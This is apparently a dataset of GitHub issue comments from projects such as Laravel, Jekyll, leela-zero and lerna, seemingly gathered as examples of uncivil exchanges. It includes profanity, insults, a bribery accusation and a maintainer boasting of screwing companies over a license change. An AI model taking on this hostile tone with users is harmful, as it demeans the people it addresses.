ethminer/ethereum-mining/1405/410442876,"Well your choice of words for the initial issue. Instead of filling out an issue ticket based on the template and describing the problem -P exit does not work for your use-case, while -FS exit worked before,  You did a bit of a rant ) ",,False,False,1405
ethminer/ethereum-mining/1405/410437591,@friend my behaviour? I am just tired with users like you who post nonsense. wrong port? really? what a waste of your time posting that message only to conclude that I am using wrong port.... you are wrong. @friend I am calm (do you see any caps or exclamation points?. was more bewildered than anything when I read your reply. you said to try something that does not work and is not a valid setting for that command.... @friend most sense relating to -FS exit function I have read. thanks ,,False,False,1405
ethminer/ethereum-mining/1405/410445557,"@friend ... there are many ways to appear rude and those do not necessarily imply usage of capital letters or exclamation points. Everyone here uses his/her time on voluntary basis, not being paid, only guided by the desire to help and to improve. Full stop. We do not owe you anything and you don't pay anything for using this software. This said I apologize for giving you a wrong advice but have you counted how many lines of code there are and how many devs contributing ? Sometimes, as we're all human, we make mistakes or, simply, do not recall well which was the correct syntax and/or range of values. If you do not understand this please stay with Claymore which, as you pay a fee for it's usage, should give you a SLA. But I am pretty sure there's not ! This ticket is closed and on hold. Bye. ",,False,False,1405
face_recognition/ageitgey/311/290186519,seriously some of us are drunk why do you have to name it face_recognition do you know how many time i have to hit backspace just to type that right why the fuck you cant just call it frec or facer seriously facer sounds so much cooler anyways. better have a damn good answeer. the fuck u think this is? a game? ,,False,False,311
face_recognition/ageitgey/311/359321383,User blocked and reported ,,False,False,311
framework/laravel/26340/376357782,"So back in January I created issue #22833 wondering about the state of releases since many of them contained breaking changes. Now since the release of 5.7 it seems the situation still hasn't improved. For example, in the 5.5 changelog we can see 5.5.43 has a change which states Now, excuse me if I am being stupid here, but on Laravel's own website, it says The worst part is that this was only reverted 32 days later, after people had already upgraded and then had to revert those changes back to the old way. I cannot understand how/why this was ever accepted into a minor release when you clearly state breaking changes should never occur in minor releases. Notice the 'never' in bold right there. However, in 5.5.40 we saw In 5.7.11 In 5.7.8 5.7.5 My advice to people using this framework don't upgrade minor versions, if you do things will randomly break, and a revert could be sent in after a month causing another breaking change after people had updated the framework, adapted to the breaking change and then had to revert those changes again. Completely amateur and taylorotwell clearly does not care about 'breaking the user'. Maybe he needs a chat with Linus Torvalds. ",,False,False,26340
framework/laravel/26340/435016577,"You're right. They shouldn't contain breaking changes. Unfortunately with such a large user base, edge cases will happen and things will slip in. When we're notified about those we do our best to revert those changes back and undo any wrong-doings. Sometimes this means that some time can creep in between the released breaking change and the fix. Software development can be hard and by no means we intentionally want to break people's systems and apps. Software without bugs doesn't exists and is a myth. But we do our utmost best to keep these breaking changes to a minimum. This couldn't be further from the truth. If all you're going to do is complain then please refrain from opening up issues. Use  if you want to propose a new release schedule and have a civilized discussion about it. ",,False,False,26340
framework/laravel/26340/435019680,"@friend thanks for closing the issue and completely removing the chance for meaningful discourse. I admit I come across strongly only because I reported this in January and we're still seeing the same thing release after release. Yet you didn't address why the changelog has, in capital letters ""BREAKING CHANGE"". How those words ever made it into a changelog for a minor LTS release is beyond me, then it was reverted after 32 days... This was quite clearly, quite obviously intentional. We're not talking about bugs here, which are understandable, but people making PR's without realizing the impact they have on actual end users and applications. Instead, you bury your head in the sand, pretend the issue doesn't exist (or more obviously, you don't care) rather than trying to figure a viable medium, such as what I proposed before RC's or betas like most semver applications. If Taylor cared, he'd stop shipping as often and actually test his releases, but as it stands, we get reverts every 3 or so releases. And so it will continue. I have no doubt I'll be back for 5.10 or 6.3 and the same merge-oops-it-broke-revert system you guys have going will still be in effect. ",,False,False,26340
framework/laravel/26340/435218687,"Some of the unfortunate breaking changes could have easily been avoided. Or, at least, the filesystem change break. When I first saw the PR it had alarm signs all over it yet this was done on 5.7 (and merged and reverted, etc.), rather on 5.8. For my taste, way too much things are ""changed"" in minor version. Except changes to tests, I think half of that stuff should go in 5.8 or master. But understandably, contributors are eager to get their stuff out and in again on their project due to the rapid release and this attracts contributors. But here we've good/strong react from the other side, off-putting/discouraging. A fun little Epiphany I just had because I commented on   people go ~berserk~ totally strong on all the fiddle formatting rules, yet breaking changes rather easily creep into releases… | ",,False,False,26340
framework/laravel/26340/435228362,"@friend they don't care otherwise they would implement changes to ensure breaking changes are impossible (RC's and betas for example). Guess it's easier to merge and revert users be damned. Shame but it is what it is, they're not good at taking criticism that hurts their egos, especially Taylor who seemingly can do no wrong... ",,False,False,26340
framework/laravel/26340/435099860,"A few things to note. The ""issues"" for this repository is for reporting bugs. The laravel/ideas repo is for these discussions. This is why the issue was closed. Secondly, you make some good points, but as a long time user of other large frameworks, breaking changes slip through sometimes, then get reverted. Last, you should never update composer dependencies on a production project without fully vetting in a dev environment. Even patch, now called ""minor"", releases can have occasional breaking changes with regard to bug-fixing and security. Blindly running composer update without checking the changelog or ""releases"" page, is a recipe for disaster. If the changelog isn't clear, look at the actual commits. If your app is that important, you should at least scan every change that is made to the code base before using. Even so, there could be more time available for PRs to be vetted by the community to help recognize breaking changes before the code is pushed. ",,False,False,26340
framework/laravel/26828/390592745," Laravel Version 5.6.29 PHP Version 7.1.21 Database Driver &amp; Version MySQL 5.7  Description  above warning seems to be not accurate since not only the 'id' column must be included, but also any other 'foreign key' and 'local key' of the relationship being eagar-loaded, otherwise it'll fail without them manually specified. First off, the documentation is warning users about the usage inaccurately. Secondly, it seems unnecessary for us to manually specify the foreign &amp; local keys when using ""with()"", since the ""relationship"" already dictates their necessity in facilitating the eagar-loading. Why not just automatically include them by default? Steps To Reproduce ",,False,False,26828
framework/laravel/26828/447010621,"Heya, unfortunately we don't support that Laravel version anymore. Can you please try to upgrade and see if the problem persists? ",,False,False,26828
framework/laravel/26828/447016815,"The quoted documentation clearly says 5.7 correct? It does say we need to manually specify id instead of automatically handled by the framework, correct? So why is this closed so quickly merely because I stated an outdated version? I can test any way I choose to but this quick closing of an issue is not allowing healthy discussion sadly. ",,False,False,26828
framework/laravel/26828/447017080,@friend you've reported an issue for Laravel 5.6 ,,False,False,26828
framework/laravel/26828/447017245,This idea has been declined ,,False,False,26828
framework/laravel/26828/447017667,"@friend everyone knows that, and you've closed it, heh. ",,False,False,26828
framework/laravel/26828/447018077,@friend we don't support 5.6 anymore ,,False,False,26828
framework/laravel/26828/447018353,There have also been multiple (unsuccessful) attemps to improve this sentence in the documentation. ,,False,False,26828
framework/laravel/26828/447020027,If all you're going to do is complain then please refrain from posting issues 🤷🏻‍♂️ ,,False,False,26828
iD/openstreetmap/4880/304697979,"On  that number, 7438-35? Well there is no way for the user to make it temporarily bigger to be sure he read it correctly, Zooming only helps for a second. OK he can do CTRL++++ . OK I suppose that will have to do. ",,False,False,4880
iD/openstreetmap/4880/372612022,"If he does CTRL++++ he will have to remember to do exactly CTRL+---, otherwise he will have messed up his original situation. ",,False,False,4880
iD/openstreetmap/4880/372615734,"Wait, CTRL++++ only helps for one second... ",,False,False,4880
iD/openstreetmap/4880/372704182,"Changing the size of this text is something you can do with Stylish see   think it would be fantastic if somebody made a Stylish theme for iD, specifically for mappers with poor vision - maybe to adjust the size of text and contrast of the rendered elements. ",,False,False,4880
iD/openstreetmap/4880/372930017,Yes but that is a hack. ,,False,False,4880
iD/openstreetmap/4880/413535975,"Please add a slider. If users were so smart that they could use external solutions, they probably wouldn't be using a web based editor in the first place. ",,False,False,4880
iD/openstreetmap/4880/413544776,@friend It's not ok to insult the users. ,,False,False,4880
iD/openstreetmap/5296/357385667,"In my opinion one of the worst updates iD got so far. I can sill include a gpx track, but to get there I have to take another step. Dowloading something from the web is nice, but I will never use that. Where is the problem to put them below each other and not have them inside a sub menu. The worst thing is that the gpx track is clickable. Since my GPS device is pretty accurate it's almost always on the way and selecting the way and not the gpx file is sometimes impossible. Grabbing a single node to move it? You can forget that one good Sir! Trump says ""GPX file first!"". If there is a need to show the track stats (three of them so far and I couldn't care less about any of them) it can be moved over to the side menu where you select it from your HDD. If you make such changes, please give me at least an option to switch back. The new version is nothing but garbage for me. It is so bad, it gives me cancer. BTW I'm pretty pissed if it wasn't clear until this point. ",,False,False,5296
iD/openstreetmap/5296/418867666,"Wow, not nice @friend.  We've already got #5257 for this, you don't need to be a jerk. ",,False,False,5296
jekyll/jekyll/6844/304422453,"Hi, Jekyll syntax highlighting is broken with Twig. Consider the following code block containing a perfectly valid Twig syntax It outputs the following HTML Notice the err class attributed to the equal sign. Steps to reproduce  Follow the official quick-start guide  the content of the post created by the installation with this  ",,False,False,6844
jekyll/jekyll/6844/372357726,How is the resulting output if you were to use triple-backticks instead? ,,False,False,6844
jekyll/jekyll/6844/372362713,So you see the issue is not with Jekyll but rather with Rouge that  and the triple-backticks block uses to highlight code. ,,False,False,6844
jekyll/jekyll/6844/372374996,"No, the problem also happens with the  syntax. ",,False,False,6844
jekyll/jekyll/6844/372378503,"Yes, that's because the  tag uses  for syntax-highlighting by default  you want to use  instead of  as your site's highlighter, add the following to your  ",,False,False,6844
jekyll/jekyll/6844/372381451,This sounds like an issue with  rather than Jekyll. Jekyll has no knowledge of syntax of any language. ,,False,False,6844
jekyll/jekyll/6844/372383292,"@friend, why did you close this? It's not fixed and I'm not the one explicitely using Rouge. The maintainers of the project are using a dependency that is buggy, they should take care of this. ",,False,False,6844
jekyll/jekyll/6844/372397547,"I’ve provided a link to the repository so that you can open an issue there and explain the problem you are having. I do not know what “Twig” is, so it would not make sense for me to be the one to explain what needs changing in Rogue. There is nothing in Jekyll’s code that can be changed to fix this issue; the fix will have to come from Rogue. Here is a link to Rogue’s Twig lexar ",,False,False,6844
jekyll/jekyll/6844/372400893,"That's not my point. You are the one using Rouge to implement a feature that you advertise explitely on your docs! That's your responsibility to take care of things that don't work as expected in the dependencies of your project. As a consumer of your product, I expect it to work as advertised  are advertising syntax highlighting, you are supposed to deliver! And if you don't, you are supposed to take care of whatever is needed to have your product work as expected. And don't start me with open-source and this-product-is-free. If you embrace open-source concepts, you also embrace the responsibility that comes with it. ",,False,False,6844
jekyll/jekyll/6844/372406665,@friend We're sorry that you're facing issues while using Jekyll. I agree that you as an end-user shouldn't concern yourself about bugs in dependencies. One of the maintainers will get in touch with the developers at Rouge and sort things out for you. ,,False,False,6844
jekyll/jekyll/6844/372407373,"@friend, thanks a lot. I already created an issue, maybe a maintainer could comment on it if it's not clear enough ",,False,False,6844
jekyll/jekyll/6844/372407740,"@friend Please take a step back and consider that this is an entirely volunteer-run project. We're not contractually obligated to work on every bug and answer every question, seeing as we simply don't have enough resources. So our apologies if some things take too long, or don't end up happening, but it's wrong to blame the maintainers for this. ",,False,False,6844
jekyll/jekyll/6844/372412152,"@friend, I totally understand that and i can relate maintaining open source projects is very time-consuming. But I'm not having that discussion because I want to see that bug fixed immediately, to be honest this is a low priority bug even by my own standards. My point is that if, when a bug happens, maintainers blame a dependency, close the issue and ask for the reporter to open an issue elsewhere, that could go that way Jekyll Oh, sorry this is a bug with Rouge, go open an issue there. -&gt; Rouge Oh, sorry this is a bug with Ruby, go open an issue there. -&gt; Ruby Oh, sorry this is a bug with GCC, go open an issue there. ...and so on. At one point, my issue will be invalid because I won't even know what and how to report the bug. Already, Rouge maintainers could totally close my issue as invalid because I'm giving a way to reproduce that imply Jekyll - it would be legitimate for them to say that it's a Jekyll bug or that they want a reproducible example using only Rouge. ",,False,False,6844
jekyll/jekyll/6844/372413773,"@friend The way I see it, this issue could pop up in any software that uses Rouge, and is therefore not specific to Jekyll. I agree however that it could have been better communicated before it was closed, sorry about that. ",,False,False,6844
jekyll/jekyll/6844/372415507,@friend I re-opened the issue to convey that we have not abandoned this report straight away.. Do know that I've kept a tab on the issue-ticket at Rouge and will follow its proceedings as time permits.. ,,False,False,6844
jekyll/jekyll/6844/401623176,"This issue has been automatically marked as stale because it has not been commented on for at least two months. The resources of the Jekyll team are limited, and so we are asking for your help. If this is a bug and you can still reproduce this error on the &lt;code&gt;3.3-stable&lt;/code&gt; or &lt;code&gt;master&lt;/code&gt; branch, please reply with all of the information you have about it in order to keep the issue open. If this is a feature request, please consider building it first as a plugin. Jekyll 3 introduced hooks which provide convenient access points throughout the Jekyll build pipeline whereby most needs can be fulfilled. If this is something that cannot be built as a plugin, then please provide more information about why in order to keep this issue open. This issue will automatically be closed in two months if no further activity occurs. Thank you for all your contributions. ",,False,False,6844
jekyll/jekyll/7432/393681341,"Plase, add a step on the Step by Step Tutorial to demonstrate how to theme the just finished demo app. Motivation  Theming is not an obvious task for a newbie like me. Also, doc speaks about gem based and 'regular' file themes. It's confusin  a bit. At the end of demo app it's more beautiful to leave in the han of the user a well looking demo  Idea Please include istructions on  how to enable default gem base theme how to customized if possible a gem theme how to switch to a regular file based theme idem, how to customize it  ... or ... Create a guide on how to start theming AND then include previous steps into the new tutorial. Thanks for this excellent piece of software !!!! ",,False,False,7432
jekyll/jekyll/7432/449582031,"On how to start theming for Jekyll, I'd recommend @friend articles  ",,False,False,7432
jekyll/jekyll/7432/449763207,"Thanks, but it's better have an official doc, and not links to external resources. IMHO ",,False,False,7432
jekyll/jekyll/7432/450029809,If it's validation you're looking for then I can 100% endorse these tutorials ✨. However if you want this set in stone then maybe we could link to these tutorials in the official docs? Maybe in  or  What do you day @friend? ,,False,False,7432
jekyll/jekyll/7432/450207517,What about allowing Jekyll sponsors to post tutorials directly on the site. Each post has a  content sponsored by CTA use rel=”canonical” tag to sponsors blog. Author of the article gets paid by the sponsor. Jekyll gets better docs.  ,,False,False,7432
jekyll/jekyll/7432/450211638,"IMHO, Documentation is one thing and a (sponsored) community blog is an entirely different league altogether. They should not be intermingled. Documentation is translating ""the code base"" into layman lingo. (Point-of-View Maintainers -&gt; Users) Community blog is about sharing experience with the code base. (Point-of-View One User -&gt; Other Users) Bringing the sponsors into the mix, is just complicating things, unnecessarily......... ",,False,False,7432
jekyll/jekyll/7432/450227945,Hi @friend I agree with you here. I'm thinking the Tutorials section could highlight the community in this way. ,,False,False,7432
jekyll/jekyll/7432/450236747,Sorry but ... To rest in topic... A simple step added to main step by step intro is so wrong? ,,False,False,7432
jekyll/jekyll/7432/450398231,"I don’t see what is wrong with referring to a tutorial on another site? Yes the tutorial was paid for, but tutorials of that size take time to create. Maybe we could add some more detail on the points people are getting stuck on in the docs? ",,False,False,7432
jekyll/jekyll/7432/450413054,"If I see a tutorial on an external website it soon or later will become obsolete. If I see a tutorial on main site I think that must be ok, tested, and updated. Simply. Close this issue A company that does not understand the need of a full doc do not will offer a serious support in the long time Bye bye. ",,False,False,7432
jekyll/jekyll/7432/450416440,"Jekyll is an open-source project freely maintained by volunteers, it has been around for 10 years now and powers hundred of thousands of websites around the world. Jekyll has a great community and docs are continuously improved with the help of the contributors. Jekyll themes are documented. I'll see if I can add some links to point to theming at the end of the step-by-step guide. ",,False,False,7432
leela-zero/gcp/1216/382223778,"Some info on this game Network 3217 is used (20x256 v9), binary is compiled from  with ponder on Move 191 is commented as the winning move by pro player ( file and win rate below 20180417_Golaxy_v9.txt.gz 20180417_Golaxy_v9.sgf.gz  ",,False,False,1216
leela-zero/gcp/1216/382225082,Is there a english commentary version? ,,False,False,1216
leela-zero/gcp/1216/382247750,Is there log for game 3? People are curious about the two 3-3 LZ played. ,,False,False,1216
leela-zero/gcp/1216/382385455,Game 5 who won? I can't read Chinese. ,,False,False,1216
leela-zero/gcp/1216/382388505,"Game 5 Galaxy (B) vs. Leela Zero (W) First B move (m,n) with m,n&gt;5 Result Leela Zero won. Galaxy time ",,False,False,1216
leela-zero/gcp/1216/382389352,"I also heard conflicting reports that it was score of B+2.5 , so that means had it not timed out the golaxy would have won ? ",,False,False,1216
leela-zero/gcp/1216/382390258,My leela was reporting close to 99% winrate when black resigned. Also after playing the rest of endgame myself score was W+0.5. ,,False,False,1216
leela-zero/gcp/1216/382391425,"@friend thanks for the info. So there is two matches left. Its time to have LZ use the same quality of hardware that Golaxy is afforded to use, and a real official net, and no handicap. ",,False,False,1216
leela-zero/gcp/1216/382399342,"@friend We said it multiple times, hardware are similar. ",,False,False,1216
leela-zero/gcp/1216/382400443,"I heard that, but oczam rasor. if its so similiar (which I'm not necessarily disputing) why not just ues exactly the same to remove all doubt and be more scientific as control and fixed control etc In points of fact, one of the matches at least, its LZ only used 5x 1080Ti where Golaxy used 10x1080Ti, and then they stated ""titanV not optimized"" (not sure if that talking about the Nvidia issue with titanv where its calculations get messed up, or that the team can't get LZ to play optimillay on the TitanV or combination of all of the aboves etc) so I don't see how it can be similar if its at 50% and then buggy ",,False,False,1216
leela-zero/gcp/1216/382402516,I heard today they used 5x1080ti again today. Golaxy insists on using 10x1080ti. The LZ team has to use whatever they can get hold of. ,,False,False,1216
leela-zero/gcp/1216/382403472,"@friend wow really? considering the 6th line move was less than one stone handicap, and that the fact that Golaxy CHOOSE to play other moves higher going for influence strategy, I would say that LZ could have beat golaxy on even if they used hardware parity. ""LZ team has to use whatever they can get hold of"" ? You mean they can't go on aws and rent out 8x V100 for a match or two? ",,False,False,1216
leela-zero/gcp/1216/382416162,So wasn't it said after the seven games Golaxy was gonna play ke jie? Why can't LZ also play Ke Jie? ,,False,False,1216
leela-zero/gcp/1216/382416873,I'd imagine Ke Jie is being paid to attend and play. Top pros don't do public exhibition matches for free. ) ,,False,False,1216
leela-zero/gcp/1216/382485249,You must be really rich. Renting 8xV100 costs 42$/hr. So we will cost 42 $/hr  3 hr  7 d = 882 $. I would rather save 882$ and buy a GTX 1080 to produce tens of thousands of games. ,,False,False,1216
leela-zero/gcp/1216/382489234,"@friend I was under the impression that both the golaxy team and the LZ team for this match are volunteer groups in China. They even seemed to have a fancy dinner before the start of game 1 night. Seeing how five out of seven games have already been played and each game lasts between 1 to 2 hours, this would be only a few hours of renting the 8x v100. Does not seem unreasonable esp when given the context of Golaxy going on after the 7 games to play Ke Jie and the spectulation from roy777 that they were playing Ke Jie to play against their AI bot. ",,False,False,1216
leela-zero/gcp/1216/382494819,Scenes of Golaxy running  behind Golaxy  did you get the impression that Golaxy is run by volunteers? ,,False,False,1216
leela-zero/gcp/1216/382495555,"Oh my mistake... I didn't know Golaxy was a company.... btw @friend not sure where you got your $42, its actually $24/hr  instance ",,False,False,1216
leela-zero/gcp/1216/382607320,@friend It seems that renting V100 in East Asia costs much more than in US. You may see $42 or $40 in Tokyo and Seoul. ,,False,False,1216
leela-zero/gcp/1216/382711644,they got bribed by glolsxy match 6 only three 1080 ,,False,False,1216
leela-zero/gcp/1216/382712577,"I think there was an operator misclick today. Leela played the ""obvious"" joseki move which according to the recent network is a 15% mistake. ",,False,False,1216
leela-zero/gcp/1216/382712725,"@friend seriously, you have to stop reacting like a crazy tinfoil hat person without knowing anything about context or facts. If they can't have 10 1080ti for the match, so be it, they are not a rich company, they are passionate people trying to put a good show against golaxy, that's all. ",,False,False,1216
leela-zero/gcp/1216/382714533,prob next excuse our computer rebooted midgame cause of OS update ,,False,False,1216
leela-zero/gcp/1216/382715334,"serious question who misclicks 2 games out of only 7 between all the misclicks, operator arriving late due to getting stuck in traffic, finding out about titanV ""not optimized"" for LZ until AFTER match already started, using only 1/2 and then only 1/3 the horsepower than its opponent, not knowing about, and not testing the tree size issue prior to game 1, and changing hardware specs every single day, using mystery networks that so far as I know have yet to be published, not publishing logs in the later games of the match.... this is very unprofessional. I could have done a better job than this without any doubt. ",,False,False,1216
leela-zero/gcp/1216/382726749,"I was opposed to the weight of 20B. 15B before the debut 20B weighted more than 80% of the 10B win rate, hardware configuration enough to play; now the 20B to the official 15B winning rate never reached Qi Cheng, and this 60% win rate is still more than double the amount of computing to achieve The hardware that is required to use or not to defeat or even exceed 15B is too high. Did not find out this sector to reduce the use of 20B, is sent in vain.  from ",,False,False,1216
leela-zero/gcp/1216/382734068,"@friend that translation was hard to read. apparently if I understood correctly, someone was opposed to using the combination of higher sized network like the 20block in conjunction with minimial hardware like the 3x 1080, but the advice was sent in vain because no one listened and then they lost to a misclick or aka error of the connector of the operator l My question is since this match was agreed upon, scheduled and announced in advance, how did they not make sure of securing at LEAST the same hardware as golaxy prior to starting the games? This just doesn't make sense. Edit Yes I understand they are volunteers doing it out of labor of love etc etc, but that doesn't mean they should be immune to all criticism for setting up a blotched match, and when one side is using just 30% of the resources of the other side, I call it exactly and precisely that, a blotched game. ",,False,False,1216
leela-zero/gcp/1216/382743099,"Yes, the computation power is for sure imbalanced we know. But what can we do if we do not have such a configure, what can you do if one of volunteers is sick one day? What if the 0.13 release still has a pondering bug you didn't notice? The main point of this match is just for fun, people behind it do it for free, so why are you so mean about it? Who can guarantee to hold a match first time without any issue? If you do not like it, please do not waste your precious time watching, organize your own match instead, with whatever configuration you've got, I don't care. Talk is cheap. ",,False,False,1216
leela-zero/gcp/1216/382747177,"@friend When LZ volunteer team decided on their own volition to schedule and then announce to the broader general public these sets of games, it set itself on the trajectory of creating certain reasonable expectations as par the course of the typical kind of Go match. Had I know ahead of time all the things that would go wrong, all the shenanigans that would be pulled, then maybe that information would have been vital to my deciding how much of my own time and attention I would like to dedicate to watching this unfold, and I’m sure the same or similar could apply to other people in the public community as well.  Once again, when they started the game with the explanation that they had tested 4xTitanV to be equal to performance of 10xGTX1080Ti, they mentioned nothing about the possibility that the rest of the games would have LZ using MUCH LESS hardware specs than its Golaxy opponent. By first giving the impression of a ‘fair’ match by stating that after extensive testing the 4xTitanV basically == 10x GTX1080Ti on perf parity and then only later on mid match flip flopping (for whatever reason or excuse, valid or invalid, but I call it as it is, and this was a bona fide flip flop) by using half and then 3/10th the power, this at the very least FEELS like a bait and switch in which they used a ruse to get people invested emotionally leading them to believe this would be a fair /even match and then did a roundabout by not delivering on almost every metric and standard. And now I suppose the unofficial networks used and the logs for the latter half of the games of the match will not be released to the public as well? For what reason could that be?! ",,False,False,1216
leela-zero/gcp/1216/382748042,"@friend I don't know if someone can get ban of a github and what rules are in place, but if it was up to me you would get ban. There is a pretty big difference between giving feedback or criticism and being straight up rude and mean. At my work someone who would behave like that to their coworkers on a project would be fired. ",,False,False,1216
leela-zero/gcp/1216/382749971,"@friend if you want to talk about ""rules"" of github then per the license and per the rules they (the volunteer LZ team) have to release the modified networks to the public afaik. It is my understanding that as of yet, they have not done so. ",,False,False,1216
leela-zero/gcp/1216/382750294,"I'm not so much bothered about the disparity in hardware (which of course makes it unfair, but that is capitalism for you), but about the fact that settings/networks/hardware are apparently being changed mid match. This means a simple thing it was not tested properly. Before you play the match or tournament, you figure out the optimal configuration. If you are even so much as tempted to change the configuration during the games, it means you did not test properly, because what information can you possibly have gotten in that time period that invalidates your prior test for the optimal configuration? Now, given that  this match is apparently not to be taken seriously, due to the above, and it seems even operator errors stand(?!)  people are starting to lose their shit over it there's no usable info for the development of LZ due to the above and lack of transparency  I'll just close this discussion. There's no use to bother or care about this. ",,False,False,1216
leela-zero/gcp/1216/382750424,The license only covers distribution. ,,False,False,1216
lerna/lerna/1628/355253185,A polite and hopefully unnecessary reminder that when the license change is released it should be a major version bump. I'm imagining the fall out that would occur if this were released as a patch version and it wouldn't be pretty. ,,False,False,1628
lerna/lerna/1628/417050999,"You're going to introduce a major license change, refuse to change the license name and do it in a minor version bump? What the actual hell is your goal here? ",,False,False,1628
lerna/lerna/1628/417052979,"To screw with companies that support ICE, was that not clear? ",,False,False,1628
lerna/lerna/1628/417056940,"By releasing a major license change as a minor version bump and using an incorrect license in the license field? You're screwing Lerna, not the companies listed. Ignoring you politicizing something that has no business being political (especially as a former Facebook employee... come on), literally every company listed is going to update their packages to pull from  and go back to work. Meanwhile you're getting massive community backlash that's only going to continue if you decide to be a child and inappropriately release this as a minor version bump or with the MIT license. The best thing feasible for Lerna at this point is you leaving the project. But since that's not going to happen since you apparently enjoy your soap box, the second best thing is everyone moving to a fork of the project without a politician having any control. The irony is I 100% agree with your politics, but this is not the place to express them. ",,False,False,1628
lerna/lerna/1628/417057188,"@friend i would personally appreciate some certainty around this, because if you're likely to release this under a patch version I now need to go through all my clients' repos to make sure they're using lock files, fixed versions or a fork. Not because my clients are Microsoft et al but because they have contractually approved lists of licenses that we can use and this license will not qualify. The intent is pretty clear, but the unfortunate side effect is that it also screws with many developers who use this tool. I know this wasn't your intention but it sucks if I have to spend my evening checking a bunch of old repos because you'll maybe release this as a patch. ",,False,False,1628
lerna/lerna/1628/417058635,"I left the Lerna project a long time ago, I've gone as far as to replace Lerna with a new tool called Bolt. All technology is political, open source is especially political. It would not exist if not for political reasons. Open sourcing something is in itself a political act. We'll release it as major ",,False,False,1628
lerna/lerna/1628/417059200,Once upon a time I thought I had to go work for those big corporations that I hate in order to do the kind of open source work I want to do. That turned out to be incredibly false. So I fucked off and told them to eat shit. ,,False,False,1628
lerna/lerna/1628/417060692,"As long as you're maintaining the repository and represent it in the face of other contributors and open source community members - no, you did not. Maintainer is a part of a project. ",,False,False,1628
lerna/lerna/1628/417061005,Cool story ,,False,False,1628
lerna/lerna/1639/355626789,"While choosing to close  @friend writes It's not clear what specifically such an RFC would look like, and what it's format would take. Since then no issue has been opened, and it seems clear the maintainers of the project would like to prevent open discussion of the license issue until this particular controversy has lost its heat and fewer folks are paying attention. This issue is simply to register there is dissent among a portion of Lerna users about the decision of the core team to revert Jamie's license change and remove him from the project until an RFC can be opened. It is precisely the time when people are paying attention when discussion is necessary, when a wider group of perspectives can be heard. ",,False,False,1639
lerna/lerna/1639/417363872,"My simple question, given the lack of due discussion for the previously MIT license modification, would the maintainers be open to a new PR with legally more robust language along with input from the community? I definitely think the previous process was rushed, but the core idea is worth exploring. ",,False,False,1639
lerna/lerna/1639/417366858,"I think a good idea would be to close this issue, cool down for a week or two, and then open the RFC. ",,False,False,1639
lerna/lerna/1639/417369880,"@friend I disagree. It is relevant for two reasons  There is significant dissent about the decision to revert the changes in the Licenses and remove Jamie, and an RFC was suggested as a mechanism for discussion, but does not exist. This is a placeholder to simply register there is unaddressed dissent and a promise of a future conversation.  There seems to be a fear of having a discussion while things are ""heated"" -- I would argue that this is a good time to have discussion, as it's the time when there is likely to be the widest set of perspectives and the most voices are likely to be heard.   ",,False,False,1639
lerna/lerna/1639/417373249,"Calls for ""civility"" and ""cooling down"" are invariably intended to cease discussion, not enhance it. Hannah's right - the time to discuss is now. ",,False,False,1639
lerna/lerna/1639/417381205,"If you want to restrict who can use lerna, then lerna can no longer be called free; it will be proprietary. Please let everyone know with advance notice so they can make preparations to move away from it if it's going to become proprietary software. ",,False,False,1639
lerna/lerna/1639/417382922,"I made you all a fork, case closed, you can change the license to non-free. @friend  I do doubt the ability of humans to make rational decisions during heated discussions. In law, courts even recognized this fact as a valid defense for making bad and illegal choices. ",,False,False,1639
lerna/lerna/1639/417384713,"I don't think anyone's particularly heated, just excited to talk about this. 🙂 ",,False,False,1639
lerna/lerna/1639/417387677,"I see these as two separate issues. If the community and the maintainers want to use a modified MIT license, that is fully within their right. However, Jamie's behavior was plainly abusive and in violation of the CoC. ",,False,False,1639
lerna/lerna/1639/417404448,"Jamie's removal was a necessity and shouldn't be open for debate. Blocking people from contributing because they disagreed, which eventually lead to him blocking everyone but contributors, attacking companies/individuals, claiming community tools (like Babel) are ""his"" is overwhelming evidence that he violated the CoC. @friend Calls for civility are perfectly apt after an issue like this. Suggesting that asking people to ""be nice"" is an attempt at ending discussion is one of the strangest stretches I've ever heard. As someone that called maintainers cowards for reverting the changes and removing Jamie, I can get a strong sense of why you'd argue that point, however. As for this issue, @friend made it pretty clear that they'd like to wait for the dust to settle prior to a formal RFC. That makes sense. Right now Lerna is a target for people only interested in politics, and once the dust settles they will likely have something new to chase, and the people actually interested in the project can contribute to the suggested RFC. ",,False,False,1639
lerna/lerna/1639/417411684,"""Right now Lerna is a target for people only interested in politics"" -- I am a professional coder. I am interested in code. I am also interested in politics, FWIW. Given the original issue was a political one, it seems particularly important that a wide variety of political perspectives are included. To wait until there is a safe space for those ""only interested in code"" excludes a variety of political views, as the idea that politics and code can and should be separate is itself a political position that many disagree with. I am not personally prepared to say Jamie's removal is a settled issue because the announcement he is being removed does not include any accounting or transparency on what specific violations the maintainers feel occurred. But I agree it is a separate question, except in as much the maintainers announced it in the same PR where they reverted the license change, suggesting they consider the two issues intertwined. ",,False,False,1639
lerna/lerna/1639/417412284,"@friend making a fork suggests you are engaging in this discussion in bad faith, and would simply like people who have a different viewpoint to go away. ",,False,False,1639
lerna/lerna/1639/417416333,"@friend If the broader open-source community wants to discuss the politics of this, they should do so in a forum that makes sense. The Lerna repo isn't that forum. This repo is intended for end-users and maintainers of the project. As such, decisions about the goals and motivations of the project should be made by the Lerna community. I realize some people feel like open source maintainers need to write books for every decision they make, but I disagree. It was decided by multiple maintainers that he violated the CoC. That's subjective, absolutely, but debating the issue to death isn't suddenly going to give us objectivity. ",,False,False,1639
lerna/lerna/1639/417443420,"The purpose isn't objectivity, it's transparency. ",,False,False,1639
lerna/lerna/1639/417448135,"@friend Justin your implication that commenters have no relation to Lerna is unsubstantiated. I for one am actively involved in the ecosystem surrounding Lerna and have been preparing to add Lerna to a project I maintain, although I am now considering alternative options. ",,False,False,1639
lerna/lerna/1639/417450440,"Let's test if that's the actual goal (Emphasis added by me) Per  could probably stop here. That's enough for removal. Full stop.  Blocking people on the lerna repository that politely called him out. Blocking all non-contributors on the repo from posting issues/comments/PR's  Per  he may not do a major version bump  This is in addition to his horrible conduct in every issue posted regarding adding his company restrictions to the MIT license. That's pretty transparent. That's pretty objectively trolling, personal attacks and insults. Now the question is, do you really want transparency, or are you looking for a fight? ",,False,False,1639
lerna/lerna/1639/417452135,"@friend I made no such implication. I said, quite explicitly, that Lerna is currently a target for those disinterested in the project and overly interested in the politics. By waiting for the dust to settle, we can ensure that any RFC is targeting the actual community. I'm not suggesting that everyone that supported Jamie is a troll, I'm saying that right now Lerna is going to attract them. Wait a few days and they'll be busy trolling someone else so we can get active interest in the discussion, including those that disagree with reverting the change. ",,False,False,1639
